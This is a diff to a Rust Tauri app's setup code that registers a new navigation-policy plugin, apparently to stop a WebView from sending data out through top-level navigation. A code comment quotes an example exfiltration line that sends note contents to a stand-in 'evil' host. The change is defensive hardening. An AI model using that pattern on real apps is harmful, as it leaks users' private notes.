@@ -35,6 +35,11 @@ pub use myne_core::{
 mod hooks;
 #[cfg(target_os = "ios")]
 mod ios_chrome;
+// myne#453 (the mobile twin of myne#383): the app-global WebView navigation
+// policy. The CSP has no directive that governs a top-level navigation, so
+// `location = "https://evil/?d=" + noteBody` is outside every policy this
+// `tauri.conf.json` can express; the `on_navigation` hook is.
+mod navigation;
 mod pdf_export;
 mod plugins;
 mod screen_guard;
@@ -101,6 +106,13 @@ pub fn run() {
         .try_init();
 
     tauri::Builder::default()
+        // myne#453: the app-global navigation policy, registered FIRST so the
+        // rule about what may load precedes every plugin that can cause a load.
+        // Order is functionally irrelevant — the plugin store is read at
+        // navigation time and fans out AND-style — but this is the one hook
+        // that reaches the config-declared `main` window, and it reads as the
+        // gate it is where it sits.
+        .plugin(navigation::init())
         .plugin(tauri_plugin_opener::init())
         // Custom-scheme delivery for the iOS widgets (`myne://open` /
         // `myne://capture`). Registered here so the WebView can read the launch
